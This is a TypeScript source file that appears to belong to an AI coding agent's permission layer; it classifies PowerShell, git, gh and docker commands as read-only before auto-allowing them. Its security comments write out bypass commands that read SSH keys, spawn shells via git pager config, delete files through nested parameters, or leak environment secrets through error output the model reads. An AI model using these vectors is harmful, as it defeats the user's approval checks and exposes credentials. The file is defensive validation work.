 * Checks if a command element is a pipeline-tail transformer that was moved
 * from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST (PIPELINE_TAIL_CMDLETS set)
 * AND passes its argLeaksValue guard via isAllowlistedCommand.
 *
 * Narrow fallback for isSafeOutputCommand call sites that need to keep the
 * "skip harmless pipeline tail" behavior for Format-Table / Select-Object / etc.
 * Does NOT match the full CMDLET_ALLOWLIST — only the migrated transformers.
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name)
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false
  }
  return isAllowlistedCommand(cmd, originalCommand)
}

/**
 * Fail-closed gate for read-only auto-allow. Returns true ONLY for a
 * PipelineAst where every element is a CommandAst — the one statement
 * shape we can fully validate. Everything else (assignments, control
 * flow, expression sources, chain operators) defaults to false.
 *
 * Single code path to true. New AST types added to PowerShell fall
 * through to false by construction.
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') return false
  // Empty commands → vacuously passes the loop below. PowerShell's
  // parser guarantees PipelineAst.PipelineElements ≥ 1 for valid source,
  // but this gate is the linchpin — defend against parser/JSON edge cases.
  if (stmt.commands.length === 0) return false
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') return false
  }
  return true
}

/**
 * Looks up a command in the allowlist, resolving aliases first.
 * Returns the config if found, or undefined.
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase()
  // Direct lookup first
  const direct = CMDLET_ALLOWLIST[lower]
  if (direct) {
    return direct
  }
  // Resolve alias to canonical and look up
  const canonical = resolveToCanonical(lower)
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical]
  }
  return undefined
}

/**
 * Sync regex-based check for security-concerning patterns in a PowerShell command.
 * Used by isReadOnly (which must be sync) as a fast pre-filter before the
 * cmdlet allowlist check. This mirrors BashTool's checkReadOnlyConstraints
 * which checks bashCommandIsSafe_DEPRECATED before evaluating read-only status.
 *
 * Returns true if the command contains patterns that indicate it should NOT
 * be considered read-only, even if the cmdlet is in the allowlist.
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim()
  if (!trimmed) {
    return false
  }

  // Subexpressions: $(...) can execute arbitrary code
  if (/\$\(/.test(trimmed)) {
    return true
  }

  // Splatting: @variable passes arbitrary parameters. Real splatting is
  // token-start only — `@` preceded by whitespace/separator/start, not mid-word.
  // `[^\w.]` excludes word chars and `.` so `user@example.com` (email) and
  // `file.@{u}` don't match, but ` @splat` / `;@splat` / `^@splat` do.
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true
  }

  // Member invocations: .Method() can call arbitrary .NET methods
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true
  }

  // Assignments: $var = ... can modify state
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true
  }

  // Stop-parsing symbol: --% passes everything raw to native commands
  if (/--%/.test(trimmed)) {
    return true
  }

  // UNC paths: \\server\share or //server/share can trigger network requests
  // and leak NTLM/Kerberos credentials
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search, short command strings
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true
  }

  // Static method calls: [Type]::Method() can invoke arbitrary .NET methods
  if (/::/.test(trimmed)) {
    return true
  }

  return false
}

/**
 * Checks if a PowerShell command is read-only based on the cmdlet allowlist.
 *
 * @param command - The original PowerShell command string
 * @param parsed - The AST-parsed representation of the command
 * @returns true if the command is read-only, false otherwise
 */
export function isReadOnlyCommand(
  command: string,
  parsed?: ParsedPowerShellCommand,
): boolean {
  const trimmedCommand = command.trim()
  if (!trimmedCommand) {
    return false
  }

  // If no parsed AST available, conservatively return false
  if (!parsed) {
    return false
  }

  // If parsing failed, reject
  if (!parsed.valid) {
    return false
  }

  const security = deriveSecurityFlags(parsed)
  // Reject commands with script blocks — we can't verify the code inside them
  // e.g., Get-Process | ForEach-Object { Remove-Item C:\foo } looks like a safe pipeline
  // but the script block contains destructive code
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false
  }

  const segments = getPipelineSegments(parsed)

  if (segments.length === 0) {
    return false
  }

  // SECURITY: Block compound commands that contain a cwd-changing cmdlet
  // (Set-Location/Push-Location/Pop-Location/New-PSDrive) alongside any other
  // statement. This was previously scoped to cd+git only, but that overlooked
  // the isReadOnlyCommand auto-allow path for cd+read compounds (finding #27):
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // Both cmdlets are in CMDLET_ALLOWLIST, so without this guard the compound
  // auto-allows. Path validation resolved ./.ssh/id_rsa against the STALE
  // validator cwd (e.g. /project), missing any Read(~/.ssh/**) deny rule.
  // At runtime PowerShell cd's to ~, reads ~/.ssh/id_rsa.
  //
  // Any compound containing a cwd-changing cmdlet cannot be auto-classified
  // read-only when other statements may use relative paths — those paths
  // resolve differently at runtime than at validation time. BashTool has the
  // equivalent guard via compoundCommandHasCd threading into path validation.
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0,
  )
  if (totalCommands > 1) {
    const hasCd = segments.some(seg =>
      seg.commands.some(cmd => isCwdChangingCmdlet(cmd.name)),
    )
    if (hasCd) {
      return false
    }
  }

  // Check each statement individually - all must be read-only
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false
    }

    // Reject file redirections (writing to files). `> $null` discards output
    // and is not a filesystem write, so it doesn't disqualify read-only status.
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        r => !r.isMerging && !isNullRedirectionTarget(r.target),
      )
      if (hasFileRedirection) {
        return false
      }
    }

    // First command must be in the allowlist
    const firstCmd = pipeline.commands[0]
    if (!firstCmd) {
      return false
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false
    }

    // Remaining pipeline commands must be safe output cmdlets OR allowlisted
    // (with arg validation). Format-Table/Measure-Object moved from
    // SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST after security review found all
    // accept calculated-property hashtables. isAllowlistedCommand runs their
    // argLeaksValue callback: bare `| Format-Table` passes, `| Format-Table
    // $env:SECRET` fails. SECURITY: nameType gate catches 'scripts\\Out-Null'
    // (raw name has path chars → 'application'). cmd.name is stripped to
    // 'Out-Null' which would match SAFE_OUTPUT_CMDLETS, but PowerShell runs
    // scripts\\Out-Null.ps1.
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i]
      if (!cmd || cmd.nameType === 'application') {
        return false
      }
      // SECURITY: isSafeOutputCommand is name-only; only short-circuit for
      // zero-arg invocations. Out-String -InputObject:(rm x) — the paren is
      // evaluated when Out-String runs. With name-only check and args, the
      // colon-bound paren bypasses. Force isAllowlistedCommand (arg validation)
      // when args present — Out-String/Out-Null/Out-Host are NOT in
      // CMDLET_ALLOWLIST so any args will reject.
      //   PoC: Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → auto-allow → Remove-Item runs.
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false
      }
    }

    // SECURITY: Reject statements with nested commands. nestedCommands are
    // CommandAst nodes found inside script block arguments, ParenExpressionAst
    // children of colon-bound parameters, or other non-top-level positions.
    // A statement with nestedCommands is by definition not a simple read-only
    // invocation — it contains executable sub-pipelines that bypass the
    // per-command allowlist check above.
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false
    }
  }

  return true
}

/**
 * Checks if a single command element is in the allowlist and passes flag validation.
 */
export function isAllowlistedCommand(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  // SECURITY: nameType is computed from the raw (pre-stripModulePrefix) name.
  // 'application' means the raw name contains path chars (. \\ /) — e.g.
  // 'scripts\\Get-Process', './git', 'node.exe'. PowerShell resolves these as
  // file paths, not as the cmdlet/command the stripped name matches. Never
  // auto-allow: the allowlist was built for cmdlets, not arbitrary scripts.
  // Known collateral: 'Microsoft.PowerShell.Management\\Get-ChildItem' also
  // classifies as 'application' (contains . and \\) and will prompt. Acceptable
  // since module-qualified names are rare in practice and prompting is safe.
  if (cmd.nameType === 'application') {
    // Bypass for explicit safe .exe names (bash `which` parity — see
    // SAFE_EXTERNAL_EXES). SECURITY: match the raw first token of cmd.text,
    // not cmd.name. stripModulePrefix collapses scripts\where.exe →
    // cmd.name='where.exe', but cmd.text preserves 'scripts\where.exe ...'.
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? ''
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false
    }
    // Fall through to lookupAllowlist — CMDLET_ALLOWLIST['where.exe'] handles
    // flag validation (empty config = all flags OK, matching bash's `which`).
  }

  const config = lookupAllowlist(cmd.name)
  if (!config) {
    return false
  }

  // If there's a regex constraint, check it against the original command
  if (config.regex && !config.regex.test(originalCommand)) {
    return false
  }

  // If there's an additional callback, check it
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false
  }

  // SECURITY: whitelist arg elementTypes — only StringConstant and Parameter
  // are statically verifiable. Everything else expands/evaluates at runtime:
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` expands,
  //                         errors "Cannot find process 'sk-ant-...'", model
  //                         reads the secret from the error
  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` same leak
  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` same leak
  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` same leak
  //   'SubExpression'     → arbitrary code (already caught by deriveSecurityFlags
  //                         at the isReadOnlyCommand layer, but isAllowlistedCommand
  //                         is also called from checkPermissionMode directly)
  // hasSyncSecurityConcerns misses bare $var (only matches `$(`/@var/.Method(/
  // $var=/--%/::); deriveSecurityFlags has no 'Variable' case; the safeFlags
  // loop below validates flag NAMES but not positional arg TYPES. File cmdlets
  // (CMDLET_PATH_CONFIG) are already protected by SAFE_PATH_ELEMENT_TYPES in
  // pathValidation.ts — this closes the gap for non-file cmdlets (Get-Process,
  // Get-Service, Get-Command, ~15 others). PS equivalent of Bash's blanket `$`
  // token check at BashTool/readOnlyValidation.ts:~1356.
  //
  // Placement: BEFORE external-command dispatch so git/gh/docker/dotnet get
  // this too (defense-in-depth with their string-based `$` checks; catches
  // @{...}/[cast]/($a+$b) that `$` substring misses). In PS argument mode,
  // bare `5` tokenizes as StringConstant (BareWord), not a numeric literal,
  // so `git log -n 5` passes.
  //
  // SECURITY: elementTypes undefined → fail-closed. The real parser always
  // sets it (parser.ts:769/781/812), so undefined means an untrusted or
  // malformed element. Previously skipped (fail-open) for test-helper
  // convenience; test helpers now set elementTypes explicitly.
  // elementTypes[0] is the command name; args start at elementTypes[1].
  if (!cmd.elementTypes) {
    return false
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i]
      if (t !== 'StringConstant' && t !== 'Parameter') {
        // ArrayLiteralAst (`Get-Process Name, Id`) maps to 'Other'. The
        // leak vectors enumerated above all have a metachar in their extent
        // text: Hashtable `@{`, Convert `[`, BinaryExpr-with-var `$`,
        // ParenExpr `(`. A bare comma-list of identifiers has none.
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
          continue
        }
        return false
      }
      // Colon-bound parameter (`-Flag:$env:SECRET`) is a SINGLE
      // CommandParameterAst — the VariableExpressionAst is its .Argument
      // child, not a separate CommandElement, so elementTypes says 'Parameter'
      // and the whitelist above passes.
      //
      // Query the parser's children[] tree instead of doing
      // string-archaeology on the arg text. children[i-1] holds the
      // .Argument child's mapped type (aligned with args[i-1]).
      // Tree query catches MORE than the string check — e.g.
      // `-InputObject:@{k=v}` (HashtableAst → 'Other', no `$` in text),
      // `-Name:('payload' > file)` (ParenExpressionAst with redirection).
      // Fallback to the extended metachar check when children is undefined
      // (backward compat / test helpers that don't set it).
      if (t === 'Parameter') {
        const paramChildren = cmd.children?.[i - 1]
        if (paramChildren) {
          if (paramChildren.some(c => c.type !== 'StringConstant')) {
            return false
          }
        } else {
          // Fallback: string-archaeology on arg text (pre-children parsers).
          // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
          // sub), `{` (scriptblock), `[` (type literal/static method).
          const arg = cmd.args[i - 1] ?? ''
          const colonIdx = arg.indexOf(':')
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false
          }
        }
      }
    }
  }

  const canonical = resolveToCanonical(cmd.name)

  // Handle external commands via shared validation
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args)
  }

  // On Windows, / is a valid flag prefix for native commands (e.g., findstr /S).
  // But PowerShell cmdlets always use - prefixed parameters, so /tmp is a path,
  // not a flag. We detect cmdlets by checking if the command resolves to a
  // Verb-Noun canonical name (either directly or via alias).
  const isCmdlet = canonical.includes('-')

  // SECURITY: if allowAllFlags is set, skip flag validation (command's entire
  // flag surface is read-only). Otherwise, missing/empty safeFlags means
  // "positional args only, reject all flags" — NOT "accept everything".
  if (config.allowAllFlags) {
    return true
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // No safeFlags defined and allowAllFlags not set: reject any flags.
    // Positional-only args are still allowed (the loop below won't fire).
    // This is the safe default — commands must opt in to flag acceptance.
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      }
      return (
        arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
      )
    })
    return !hasFlags
  }

  // Validate that all flags used are in the allowlist.
  // SECURITY: use elementTypes as ground
  // truth for parameter detection. PowerShell's tokenizer accepts en-dash/
  // em-dash/horizontal-bar (U+2013/2014/2015) as parameter prefixes; a raw
  // startsWith('-') check misses `–ComputerName` (en-dash). The parser maps
  // CommandParameterAst → 'Parameter' regardless of dash char.
  // elementTypes[0] is the name element; args start at elementTypes[1].
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!
    // For cmdlets: trust elementTypes (AST ground truth, catches Unicode dashes).
    // For native exes on Windows: also check `/` prefix (argv convention, not
    // tokenizer — the parser sees `/S` as a positional, not CommandParameterAst).
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
    if (isFlag) {
      // For cmdlets, normalize Unicode dash to ASCII hyphen for safeFlags
      // comparison (safeFlags entries are always written with ASCII `-`).
      // Native-exe safeFlags are stored with `/` (e.g. '/FO') — don't touch.
      let paramName = isCmdlet ? '-' + arg.slice(1) : arg
      const colonIndex = paramName.indexOf(':')
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex)
      }

      // -ErrorAction/-Verbose/-Debug etc. are accepted by every cmdlet via
      // [CmdletBinding()] and only route error/warning/progress streams —
      // they can't make a read-only cmdlet write. pathValidation.ts already
      // merges these into its per-cmdlet param sets (line ~1339); this is
      // the same merge for safeFlags. Without it, `Get-Content file.txt
      // -ErrorAction SilentlyContinue` prompts despite Get-Content being
      // allowlisted. Only for cmdlets — native exes don't have common params.
      const paramLower = paramName.toLowerCase()
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue
      }
      const isSafe = config.safeFlags.some(
        flag => flag.toLowerCase() === paramLower,
      )
      if (!isSafe) {
        return false
      }
    }
  }

  return true
}

// ---------------------------------------------------------------------------
// External command validation (git, gh, docker) using shared configs
// ---------------------------------------------------------------------------

function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args)
    case 'gh':
      return isGhSafe(args)
    case 'docker':
      return isDockerSafe(args)
    case 'dotnet':
      return isDotnetSafe(args)
    default:
      return false
  }
}

const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  // SECURITY: --attr-source creates a parser differential. Git treats the
  // token after the tree-ish value as a pathspec (not the subcommand), but
  // our skip-by-2 loop would treat it as the subcommand:
  //   git --attr-source HEAD~10 log status
  //   validator: advances past HEAD~10, sees subcmd=log → allow
  //   git:       consumes `log` as pathspec, runs `status` as the real subcmd
  // Verified with `GIT_TRACE=1 git --attr-source HEAD~10 log status` →
  // `trace: built-in: git status`. Reject outright rather than skip-by-2.
  '--attr-source',
])

// Git global flags that accept a separate (space-separated) value argument.
// When the loop encounters one without an inline `=` value, it must skip the
// next token so the value isn't mistaken for the subcommand.
//
// SECURITY: This set must be COMPLETE. Any value-consuming global flag not
// listed here creates a parser differential: validator sees the value as the
// subcommand, git consumes it and runs the NEXT token. Audited against
// `man git` + GIT_TRACE for git 2.51; --list-cmds is `=`-only, booleans
// (-p/--bare/--no-*/--*-pathspecs/--html-path/etc.) advance by 1 via the
// default path. --attr-source REMOVED: it also triggers pathspec parsing,
// creating a second differential — moved to DANGEROUS_GIT_GLOBAL_FLAGS above.
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
])

// Git short global flags that accept attached-form values (no space between
// flag letter and value). Long options (--git-dir etc.) require `=` or space,
// so the split-on-`=` check handles them. But `-ccore.pager=sh` and `-C/path`
// need prefix matching: git parses `-c<name>=<value>` and `-C<path>` directly.
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C']

function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET,
  // $VAR). deriveSecurityFlags does not gate bare Variable args. The validator
  // sees `$VAR` as text; PowerShell expands it at runtime. Parser differential:
  //   git diff $VAR   where $VAR = '--output=/tmp/evil'
  //   → validator sees positional '$VAR' → validateFlags passes
  //   → PowerShell runs `git diff --output=/tmp/evil` → file write
  // This generalizes the ls-remote inline `$` guard below to all git subcommands.
  // Bash equivalent: BashTool blanket
  // `$` rejection at readOnlyValidation.ts:~1352. isGhSafe has the same guard.
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  // Skip over global flags before the subcommand, rejecting dangerous ones.
  // Flags that take space-separated values must consume the next token so it
  // isn't mistaken for the subcommand (e.g. `git --namespace foo status`).
  let idx = 0
  while (idx < args.length) {
    const arg = args[idx]
    if (!arg || !arg.startsWith('-')) {
      break
    }
    // SECURITY: Attached-form short flags. `-ccore.pager=sh` splits on `=` to
    // `-ccore.pager`, which isn't in DANGEROUS_GIT_GLOBAL_FLAGS. Git accepts
    // `-c<name>=<value>` and `-C<path>` with no space. We must prefix-match.
    // Note: `--cached`, `--config-env`, etc. already fail startsWith('-c') at
    // position 1 (`-` ≠ `c`). The `!== '-'` guard only applies to `-c`
    // (git config keys never start with `-`, so `-c-key` is implausible).
    // It does NOT apply to `-C` — directory paths CAN start with `-`, so
    // `git -C-trap status` must reject. `git -ccore.pager=sh log` spawns a shell.
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false
      }
    }
    const hasInlineValue = arg.includes('=')
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false
    }
    // Consume the next token if the flag takes a separate value
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2
    } else {
      idx++
    }
  }

  if (idx >= args.length) {
    return true
  }

  // Try multi-word subcommand first (e.g. 'stash list', 'config --get', 'remote show')
  const first = args[idx]?.toLowerCase() || ''
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : ''

  // GIT_READ_ONLY_COMMANDS keys are like 'git diff', 'git stash list'
  const twoWordKey = `git ${first} ${second}`
  const oneWordKey = `git ${first}`

  let config: ExternalCommandConfig | undefined =
    GIT_READ_ONLY_COMMANDS[twoWordKey]
  let subcommandTokens = 2

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(idx + subcommandTokens)

  // git ls-remote URL rejection — ported from BashTool's inline guard
  // (src/tools/BashTool/readOnlyValidation.ts:~962). ls-remote with a URL
  // is a data-exfiltration vector (encode secrets in hostname → DNS/HTTP).
  // Reject URL-like positionals: `://` (http/git protocols), `@` + `:` (SSH
  // git@host:path), and `$` (variable refs — $env:URL reaches here as the
  // literal string '$env:URL' when the arg's elementType is Variable; the
  // security-flag checks don't gate bare Variable positionals passed to
  // external commands).
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (
          arg.includes('://') ||
          arg.includes('@') ||
          arg.includes(':') ||
          arg.includes('$')
        ) {
          return false
        }
      }
    }
  }

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' })
}

function isGhSafe(args: string[]): boolean {
  // gh commands are network-dependent; only allow for ant users
  if (process.env.USER_TYPE !== 'ant') {
    return false
  }

  if (args.length === 0) {
    return true
  }

  // Try two-word subcommand first (e.g. 'pr view')
  let config: ExternalCommandConfig | undefined
  let subcommandTokens = 0

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[twoWordKey]
    subcommandTokens = 2
  }

  // Try single-word subcommand (e.g. 'gh version')
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(subcommandTokens)

  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET).
  // deriveSecurityFlags does not gate bare Variable args — only subexpressions,
  // splatting, expandable strings, etc. All gh subcommands are network-facing,
  // so a variable arg is a data-exfiltration vector:
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell expands at runtime → secret sent to GitHub API.
  // git ls-remote has an equivalent inline guard; this generalizes it for gh.
  // Bash equivalent: BashTool blanket `$` rejection at readOnlyValidation.ts:~1352.
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false
    }
  }
  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: blanket PowerShell `$` variable rejection. Same guard as
  // isGitSafe and isGhSafe. Parser differential: validator sees literal
  // '$env:X'; PowerShell expands at runtime. Runs BEFORE the fast-path
  // return — the previous location (after fast-path) never fired for
  // `docker ps`/`docker images`. The earlier comment claiming those take no
  // --format was wrong: `docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // auto-allowed, PowerShell expanded, docker errored with the secret in
  // its output, model read it. Check ALL args, not flagArgs — args[0]
  // (subcommand slot) could also be `$env:X`. elementTypes whitelist isn't
  // applicable here: this function receives string[] (post-stringify), not
  // ParsedCommandElement; the isAllowlistedCommand caller applies the
  // elementTypes gate one layer up.
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`

  // Fast path: EXTERNAL_READONLY_COMMANDS entries ('docker ps', 'docker images')
  // have no flag constraints — allow unconditionally (after $ guard above).
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true
  }

  // DOCKER_READ_ONLY_COMMANDS entries ('docker logs', 'docker inspect') have
  // per-flag configs. Mirrors isGhSafe: look up config, then validateFlags.
  const config: ExternalCommandConfig | undefined =
    DOCKER_READ_ONLY_COMMANDS[oneWordKey]
  if (!config) {
    return false
  }

  const flagArgs = args.slice(1)

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false
  }

  // dotnet uses top-level flags like --version, --info, --list-runtimes
  // All args must be in the safe set
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false
    }
  }

  return true
}
